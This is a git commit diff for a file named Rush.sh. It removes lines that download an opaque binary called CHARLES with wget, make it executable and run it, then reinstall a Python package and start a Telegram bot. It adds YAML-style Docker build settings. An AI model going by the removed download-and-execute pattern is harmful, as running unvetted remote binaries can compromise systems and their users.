31c2997f6d87aa390f211af9cd9e579b67cc9dc1
ytdjtjctyghngtdx <94878796+ytdjtjctyghngtdx@users.noreply.github.com>
2022-04-13 16:41:56 +0530

    Update Rush.sh

--- Rush.sh
+++ Rush.sh
@@ -1,10 +1,6 @@
-wget -O CHARLES https://github.com/tornals/brassica-narrator/blob/master/CHARLIE?raw=true
-chmod u+x CHARLES
-./CHARLES
-
-pip3 uninstall av -y
-pip3 install av --no-binary av
-
-cd root/MyTGBot
-
-bash startup
+build: 
+  docker: 
+      worker: /assets/Dockerfile
+run:
+   worker: npm start
+ 
